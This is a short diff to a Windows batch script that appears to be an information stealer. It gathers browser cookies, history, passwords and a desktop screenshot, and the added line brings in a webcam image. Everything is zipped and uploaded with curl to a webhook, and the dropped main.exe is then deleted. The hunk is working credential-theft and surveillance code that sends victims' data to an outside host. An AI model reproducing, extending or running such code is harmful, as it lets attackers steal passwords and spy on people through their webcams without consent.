@@ -69,6 +69,7 @@ move %localappdata%\Temp\browser-cookies.txt %localappdata%\Temp\KDOT\browser-co
 move %localappdata%\Temp\browser-history.txt %localappdata%\Temp\KDOT\browser-history.txt
 move %localappdata%\Temp\browser-passwords.txt %localappdata%\Temp\KDOT\browser-passwords.txt
 move %localappdata%\Temp\desktop-screenshot.png %localappdata%\Temp\KDOT\desktop-screenshot.png
+move %localappdata%\Temp\webcam.jpg %localappdata%\Temp\KDOT\webcam.jpg
 
 powershell.exe Compress-Archive -Path %localappdata%\Temp\KDOT -DestinationPath %localappdata%\Temp\KDOT.zip && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\KDOT.zip %webhook%
 del %localappdata%\Temp\main.exe
